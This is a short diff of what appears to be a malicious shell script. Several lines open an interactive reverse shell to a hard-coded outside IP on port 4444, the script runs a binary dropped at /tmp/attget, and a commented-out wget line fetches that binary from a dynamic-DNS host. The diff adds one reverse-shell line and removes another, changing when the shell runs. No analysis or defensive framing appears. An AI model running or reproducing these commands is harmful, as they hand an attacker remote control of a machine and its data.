@@ -17,11 +17,12 @@ else
     /bin/bash -i >& /dev/tcp/96.62.214.13/4444 0>&1 &
 fi
 
-/bin/bash -i >& /dev/tcp/96.62.214.13/4444 0>&1 &
-
 sleep 2
 chmod +x /tmp/attget
 /tmp/attget skip
+sleep 2
+
+/bin/bash -i >& /dev/tcp/96.62.214.13/4444 0>&1 &
 sleep 2
 
 # wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget"
